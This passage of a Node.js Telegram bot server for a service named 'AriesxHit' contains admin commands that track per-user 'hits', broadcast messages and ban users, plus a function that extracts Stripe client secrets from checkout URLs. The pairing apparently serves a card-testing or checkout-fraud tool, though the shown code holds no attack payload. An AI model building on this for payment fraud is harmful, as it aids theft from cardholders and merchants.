          const rank = db.prepare('SELECT COUNT(*) + 1 as rank FROM telegram_users WHERE hits > ? AND tg_id != "SYSTEM_BONUS_HITS"').get(user.hits);

          const text = `👤 <b>User Information</b>\n` +
            `═══════════════════════\n\n` +
            `🆔 ID: ${user.tg_id}\n` +
            `📛 Name: ${user.name}\n` +
            `🎯 Hits: ${user.hits}\n` +
            `🏅 Rank: ${rank?.rank || 'N/A'}\n` +
            `📅 Created: ${user.created_at}\n` +
            `🔄 Updated: ${user.updated_at}\n\n` +
            `═══════════════════════`;

          await sendMessage(BOT_TOKEN, chatId, text);
          return;
        } catch (error) {
          console.error('Admin: Error getting user info:', error);
          await sendMessage(BOT_TOKEN, chatId, '❌ Error getting user info');
        }
      }

      if (msg.text === '/admin_reset_hits') {
        try {
          // Reset all user hits (keep system bonus)
          db.prepare('UPDATE telegram_users SET hits = 0 WHERE tg_id != "SYSTEM_BONUS_HITS"').run();

          const text = `🔄 <b>All User Hits Reset!</b>\n\n` +
            `✅ Reset all user hit counts to 0\n` +
            `🎁 System bonus hits preserved\n` +
            `📊 Use /admin_stats to verify`;

          await sendMessage(BOT_TOKEN, chatId, text);
          return;
        } catch (error) {
          console.error('Admin: Error resetting hits:', error);
          await sendMessage(BOT_TOKEN, chatId, '❌ Error resetting hits');
        }
      }

      if (msg.text === '/admin_system_info') {
        try {
          const dbSize = db.prepare('SELECT COUNT(*) as users FROM telegram_users').get();
          const dbStats = db.prepare(`
            SELECT
              COUNT(CASE WHEN tg_id = 'SYSTEM_BONUS_HITS' THEN 1 END) as system_users,
              COUNT(CASE WHEN tg_id != 'SYSTEM_BONUS_HITS' THEN 1 END) as real_users,
              SUM(hits) as total_hits,
              AVG(hits) as avg_hits
            FROM telegram_users
          `).get();

          const text = `🖥️ <b>SYSTEM INFORMATION</b>\n` +
            `═══════════════════════\n\n` +
            `💾 <b>Database:</b>\n` +
            `👥 Total Users: ${dbSize?.users || 0}\n` +
            `🎯 Real Users: ${dbStats?.real_users || 0}\n` +
            `🤖 System Users: ${dbStats?.system_users || 0}\n\n` +
            `📊 <b>Statistics:</b>\n` +
            `🌍 Total Hits: ${dbStats?.total_hits || 0}\n` +
            `📈 Average Hits: ${Math.round(dbStats?.avg_hits || 0)}\n\n` +
            `⚡ <b>Server Status:</b> Online\n` +
            `🤖 <b>Bot Status:</b> Active\n\n` +
            `═══════════════════════`;

          await sendMessage(BOT_TOKEN, chatId, text);
          return;
        } catch (error) {
          console.error('Admin: Error getting system info:', error);
          await sendMessage(BOT_TOKEN, chatId, '❌ Error getting system info');
        }
      }

      if (msg.text.startsWith('/admin_broadcast')) {
        try {
          const message = msg.text.replace('/admin_broadcast', '').trim();
          if (!message) {
            await sendMessage(BOT_TOKEN, chatId, '❌ <b>Invalid Format</b>\n\nUsage: /admin_broadcast <message>\nExample: /admin_broadcast Hello everyone!');
            return;
          }

          if (message.length > 4000) {
            await sendMessage(BOT_TOKEN, chatId, '❌ Message too long. Maximum 4000 characters allowed.');
            return;
          }

          const users = db.prepare('SELECT tg_id FROM telegram_users WHERE tg_id != "SYSTEM_BONUS_HITS"').all();
          let successCount = 0;
          let failCount = 0;

          for (const user of users) {
            try {
              const result = await sendMessage(BOT_TOKEN, user.tg_id, `📢 <b>ADMIN ANNOUNCEMENT</b>\n\n${message}`);
              if (result.ok) successCount++;
              else failCount++;
            } catch (error) {
              failCount++;
            }
          }

          const text = `📢 <b>Broadcast Complete!</b>\n\n` +
            `✅ Sent to: ${successCount} users\n` +
            `❌ Failed: ${failCount} users\n` +
            `📝 Message: "${message}"`;

          await sendMessage(BOT_TOKEN, chatId, text);
          return;
        } catch (error) {
          console.error('Admin: Error broadcasting:', error);
          await sendMessage(BOT_TOKEN, chatId, '❌ Error broadcasting message');
        }
      }

      if (msg.text === '/admin_restart') {
        try {
          const text = `🔄 <b>SERVER RESTART INITIATED</b>\n\n` +
            `⚡ Shutting down AriesxHit server...\n` +
            `⏰ Render will automatically restart the service\n` +
            `📡 Webhook will be restored automatically\n` +
            `✅ You'll be notified when the server is back online`;

          await sendMessage(BOT_TOKEN, chatId, text);

          console.log('[ADMIN] Server restart initiated by admin');

          // Send confirmation message before shutdown
          setTimeout(() => {
            console.log('[ADMIN] Server shutting down for restart...');
            process.exit(0); // Clean exit - Render will restart the service
          }, 1000);

          return;
        } catch (error) {
          console.error('Admin: Error initiating restart:', error);
          await sendMessage(BOT_TOKEN, chatId, '❌ Error initiating restart');
        }
      }

      if (msg.text === '/admin_users') {
        try {
          const users = db.prepare('SELECT tg_id, name, hits FROM telegram_users WHERE tg_id != "SYSTEM_BONUS_HITS" ORDER BY hits DESC').all();

          let text = `👥 <b>ALL USERS (${users.length})</b>\n` +
            `═══════════════════════\n\n`;

          users.forEach((user, i) => {
            text += `${i + 1}. ${user.name} (${user.tg_id})\n`;
            text += `   🎯 ${user.hits} hits\n\n`;
          });

          text += `═══════════════════════`;

          await sendMessage(BOT_TOKEN, chatId, text);
          return;
        } catch (error) {
          console.error('Admin: Error getting users:', error);
          await sendMessage(BOT_TOKEN, chatId, '❌ Error getting user list');
        }
      }

      if (msg.text.startsWith('/admin_ban')) {
        try {
          const parts = msg.text.split(' ');
          if (parts.length !== 2) {
            await sendMessage(BOT_TOKEN, chatId, '❌ <b>Invalid Format</b>\n\nUsage: /admin_ban <user_id>\nExample: /admin_ban 123456789');
            return;
          }

          const targetTgId = parts[1];

          if (!targetTgId || !/^\d{5,15}$/.test(targetTgId)) {
            await sendMessage(BOT_TOKEN, chatId, '❌ Invalid user ID format. Must be a valid Telegram user ID (5-15 digits).');
            return;
          }
          const user = db.prepare('SELECT name FROM telegram_users WHERE tg_id = ?').get(targetTgId);

          if (!user) {
            await sendMessage(BOT_TOKEN, chatId, `❌ User ${targetTgId} not found in database.`);
            return;
          }

          if (targetTgId === '6447766151') {
            await sendMessage(BOT_TOKEN, chatId, '❌ Cannot ban the admin account.');
            return;
          }

          if (targetTgId === 'SYSTEM_BONUS_HITS') {
            await sendMessage(BOT_TOKEN, chatId, '❌ Cannot ban the system bonus account.');
            return;
          }

          // Mark user as banned (you can implement actual ban logic)
          db.prepare('UPDATE telegram_users SET name = ? WHERE tg_id = ?').run(`[BANNED] ${user.name}`, targetTgId);

          const text = `🚫 <b>User Banned!</b>\n\n` +
            `👤 User: ${user.name} (${targetTgId})\n` +
            `✅ Status: Banned\n` +
            `🔒 Access restricted`;

          await sendMessage(BOT_TOKEN, chatId, text);
          return;
        } catch (error) {
          console.error('Admin: Error banning user:', error);
          await sendMessage(BOT_TOKEN, chatId, '❌ Error banning user');
        }
      }

      if (msg.text === '/admin_backup') {
        try {
          const userCount = db.prepare('SELECT COUNT(*) as count FROM telegram_users WHERE tg_id != "SYSTEM_BONUS_HITS"').get();
          const totalHits = db.prepare('SELECT SUM(hits) as total FROM telegram_users').get();

          const text = `💾 <b>DATABASE BACKUP INFO</b>\n` +
            `═══════════════════════\n\n` +
            `👥 Users: ${userCount?.count || 0}\n` +
            `🌍 Total Hits: ${totalHits?.total || 0}\n` +
            `📅 Backup Date: ${new Date().toISOString()}\n\n` +
            `💡 <b>Manual Backup Steps:</b>\n` +
            `1. Download database from Render\n` +
            `2. Save to secure location\n` +
            `3. Keep multiple backup copies\n\n` +
            `═══════════════════════`;

          await sendMessage(BOT_TOKEN, chatId, text);
          return;
        } catch (error) {
          console.error('Admin: Error getting backup info:', error);
          await sendMessage(BOT_TOKEN, chatId, '❌ Error getting backup info');
        }
      }

      if (msg.text === '/admin_webhook') {
        try {
          const text = `🔗 <b>WEBHOOK STATUS</b>\n` +
            `═══════════════════════\n\n` +
            `🌐 URL: https://api.mikeyyfrr.me/api/tg/webhook\n` +
            `⚡ Status: Active\n` +
            `🤖 Bot Token: Configured\n` +
            `📡 Last Update: ${new Date().toLocaleString()}\n\n` +
            `✅ Webhook is working properly!\n\n` +
            `═══════════════════════`;

          await sendMessage(BOT_TOKEN, chatId, text);
          return;
        } catch (error) {
          console.error('Admin: Error getting webhook info:', error);
          await sendMessage(BOT_TOKEN, chatId, '❌ Error getting webhook info');
        }
      }

      if (msg.text === '/admin_clear_inactive') {
        try {
          // Clear users with 0 hits (except system bonus)
          const result = db.prepare('DELETE FROM telegram_users WHERE hits = 0 AND tg_id != "SYSTEM_BONUS_HITS"').run();

          const text = `🧹 <b>CLEANUP COMPLETE</b>\n\n` +
            `🗑️ Removed: ${result.changes} inactive users\n` +
            `📊 Users with 0 hits cleared\n` +
            `✅ Database optimized`;

          await sendMessage(BOT_TOKEN, chatId, text);
          return;
        } catch (error) {
          console.error('Admin: Error clearing inactive users:', error);
          await sendMessage(BOT_TOKEN, chatId, '❌ Error clearing inactive users');
        }
      }

      if (msg.text === '/admin_performance') {
        try {
          const startTime = Date.now();
          // Simple performance test
          const userCount = db.prepare('SELECT COUNT(*) as count FROM telegram_users').get();
          const hitSum = db.prepare('SELECT SUM(hits) as total FROM telegram_users').get();
          const queryTime = Date.now() - startTime;

          const text = `⚡ <b>PERFORMANCE STATUS</b>\n` +
            `═══════════════════════\n\n` +
            `🕐 Query Time: ${queryTime}ms\n` +
            `💾 Database: Operational\n` +
            `🤖 Bot: Responding\n` +
            `🌐 Server: Online\n\n` +
            `📊 Recent Stats:\n` +
            `👥 Users: ${userCount?.count || 0}\n` +
            `🎯 Hits: ${hitSum?.total || 0}\n\n` +
            `✅ All systems operational!\n\n` +
            `═══════════════════════`;

          await sendMessage(BOT_TOKEN, chatId, text);
          return;
        } catch (error) {
          console.error('Admin: Error checking performance:', error);
          await sendMessage(BOT_TOKEN, chatId, '❌ Error checking performance');
        }
      }

      if (msg.text === '/admin_backup_db') {
        try {
          const success = db.backup();
          if (success) {
            const text = `💾 <b>DATABASE BACKUP SUCCESSFUL</b>\n` +
              `═══════════════════════\n\n` +
              `✅ Database backed up to persistent storage\n` +
              `📁 Location: ${process.env.DATABASE_BACKUP_PATH || 'backup/ariesxhit.db'}\n` +
              `🕐 Timestamp: ${new Date().toISOString()}\n\n` +
              `💡 <b>Backup will persist across deployments</b>\n\n` +
              `═══════════════════════`;

            await sendMessage(BOT_TOKEN, chatId, text);
          } else {
            await sendMessage(BOT_TOKEN, chatId, '❌ Database backup failed');
          }
          return;
        } catch (error) {
          console.error('Admin: Error backing up database:', error);
          await sendMessage(BOT_TOKEN, chatId, '❌ Error backing up database');
        }
      }

      if (msg.text === '/admin_restore_db') {
        try {
          const success = db.restore();
          if (success) {
            const text = `🔄 <b>DATABASE RESTORE SUCCESSFUL</b>\n` +
              `═══════════════════════\n\n` +
              `✅ Database restored from backup\n` +
              `📁 Source: ${process.env.DATABASE_BACKUP_PATH || 'backup/ariesxhit.db'}\n\n` +
              `⚠️ <b>Server restart may be required</b>\n` +
              `   for changes to take effect\n\n` +
              `═══════════════════════`;

            await sendMessage(BOT_TOKEN, chatId, text);
          } else {
            await sendMessage(BOT_TOKEN, chatId, '❌ Database restore failed - no backup found');
          }
          return;
        } catch (error) {
          console.error('Admin: Error restoring database:', error);
          await sendMessage(BOT_TOKEN, chatId, '❌ Error restoring database');
        }
      }

      if (msg.text === '/admin_debug_users') {
        try {
          const allUsers = db.prepare('SELECT tg_id, name, hits FROM telegram_users ORDER BY created_at DESC').all();

          let text = `🐛 <b>DEBUG: ALL DATABASE USERS</b>\n` +
            `═══════════════════════\n\n`;

          allUsers.forEach((user, i) => {
            const type = user.tg_id === 'SYSTEM_BONUS_HITS' ? '🤖 SYSTEM' : '👤 USER';
            text += `${i + 1}. ${type} ${user.name} (${user.tg_id})\n`;
            text += `   🎯 ${user.hits} hits\n\n`;
          });

          text += `═══════════════════════\n` +
            `📊 Total Records: ${allUsers.length}`;

          await sendMessage(BOT_TOKEN, chatId, text);
          return;
        } catch (error) {
          console.error('Admin: Error in debug users:', error);
          await sendMessage(BOT_TOKEN, chatId, '❌ Error getting debug info');
        }
      }


      if (msg.text === '/admin_help' || msg.text === '/admincmd') {
        try {
          const text = `🔧 <b>ADMIN COMMANDS</b>\n` +
            `═══════════════════════\n\n` +
            `👥 /admin_users - List all users\n` +
            `🐛 /admin_debug_users - Debug all DB records\n` +
            `👤 /admin_user_info <id> - User details\n` +
            `➕ /admin_add_hits <id> <amount> - Add hits\n` +
            `🚫 /admin_ban <id> - Ban user\n` +
            `📢 /admin_broadcast <msg> - Send to all users\n` +
            `🔄 /admin_restart - Restart server\n` +
            `🧹 /admin_clear_inactive - Remove 0-hit users\n` +
            `💾 /admin_backup - Backup information\n` +
            `💽 /admin_backup_db - Backup database to persistent storage\n` +
            `🔄 /admin_restore_db - Restore database from backup\n` +
            `🔗 /admin_webhook - Webhook status\n` +
            `⚡ /admin_performance - System performance\n` +
            `🖥️ /admin_system_info - Server & DB info\n` +
            `📊 /admin_stats - System statistics\n` +
            `❓ /admin_help or /admincmd - This help message\n\n` +
            `═══════════════════════\n` +
            `🔒 Admin Only Commands\n` +
            `📝 Use: /command <required> [optional]`;

          await sendMessage(BOT_TOKEN, chatId, text);
          return;
        } catch (error) {
          console.error('Admin: Error showing help:', error);
          await sendMessage(BOT_TOKEN, chatId, '❌ Error showing admin help');
        }
      }
    } // End of admin commands block





    // Test command for anyone to verify bot is working
    if (msg?.text === '/test') {
      try {
        const text = `✅ <b>Bot is working!</b>\n\n` +
          `👤 User ID: ${tgId}\n` +
          `📝 Your message: ${msg.text}\n` +
          `⏰ Time: ${new Date().toLocaleString()}\n\n` +
          `The bot is responding correctly! 🤖`;
        await sendMessage(BOT_TOKEN, chatId, text);
        return;
      } catch (error) {
        console.error('Error processing /test command:', error);
      }
    }

    if (msg?.text === '/start') {
      try {
        setUserName(tgId, firstName);
        const text = getMainMenuText(firstName, tgId);
        const result = await sendMessage(BOT_TOKEN, chatId, text, replyMarkup(MAIN_MENU_KEYBOARD));
        if (!result.ok) console.error('Webhook: Failed to send start message:', result.error);
      } catch (error) {
        console.error('Webhook: Error processing /start command:', error);
      }
    }
  } catch (error) {
    console.error('Webhook: Unexpected error:', error);
  }
});

// Extract Stripe data from checkout URL
function extractStripeData(checkoutUrl) {
  try {
    const url = new URL(checkoutUrl);

    // Extract client secret from URL fragment or query params
    let clientSecret = null;
    let publishableKey = null;

    // Check URL hash/fragment for client secret
    if (url.hash) {
      const hashParams = new URLSearchParams(url.hash.substring(1));
      clientSecret = hashParams.get('client_secret') ||
                    hashParams.get('cs_live') ||
                    hashParams.get('cs_test') ||
                    url.hash.match(/cs_[a-zA-Z0-9_]+/)?.[0];
    }

    // Check query parameters
    if (!clientSecret) {
      clientSecret = url.searchParams.get('client_secret') ||
                    url.searchParams.get('cs_live') ||
                    url.searchParams.get('cs_test');
    }

    // For Stripe checkout links, try to extract publishable key from URL structure
    if (url.hostname.includes('checkout.stripe.com') || url.hostname.includes('pay.')) {
      // Extract from path or try common patterns
      const pathParts = url.pathname.split('/');
      if (pathParts.includes('c') && pathParts.includes('pay')) {
        // This is a Stripe checkout link
        return {
          provider: 'stripe',
          clientSecret: clientSecret,
          publishableKey: publishableKey, // Will be null for now
          sessionId: pathParts[pathParts.length - 1]?.split('#')[0],
          url: checkoutUrl
        };
      }
    }

    return {
      provider: 'unknown',
      clientSecret: clientSecret,
      publishableKey: publishableKey,
      url: checkoutUrl
    };

  } catch (error) {
    console.error('Error extracting Stripe data:', error);
    return {
      provider: 'unknown',
      error: error.message,
      url: checkoutUrl
    };
  }
}

module.exports = router;
